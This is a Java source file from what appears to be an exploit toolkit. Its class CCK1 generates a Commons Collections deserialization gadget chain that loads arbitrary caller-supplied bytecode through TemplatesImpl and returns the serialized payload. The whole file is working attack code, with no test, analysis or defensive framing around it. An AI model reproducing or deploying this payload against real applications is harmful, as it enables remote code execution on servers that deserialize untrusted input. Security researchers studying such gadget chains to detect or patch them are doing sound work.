package org.sec.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CCK1 extends Payload {
    public static byte[] getPayloadUseByteCodes(byte[] byteCodes) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{byteCodes});
            setFieldValue(templates, "_name", "t");
            InvokerTransformer transformer = new InvokerTransformer("toString",
                    new Class[0], new Object[0]);
            HashMap<String, String> innerMap = new HashMap<>();
            Map m = LazyMap.decorate(innerMap, transformer);
            Map outerMap = new HashMap();
            TiedMapEntry tied = new TiedMapEntry(m, templates);
            outerMap.put(tied, "t");
            innerMap.clear();
            setFieldValue(transformer, "iMethodName", "newTransformer");
            return serialize(outerMap);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
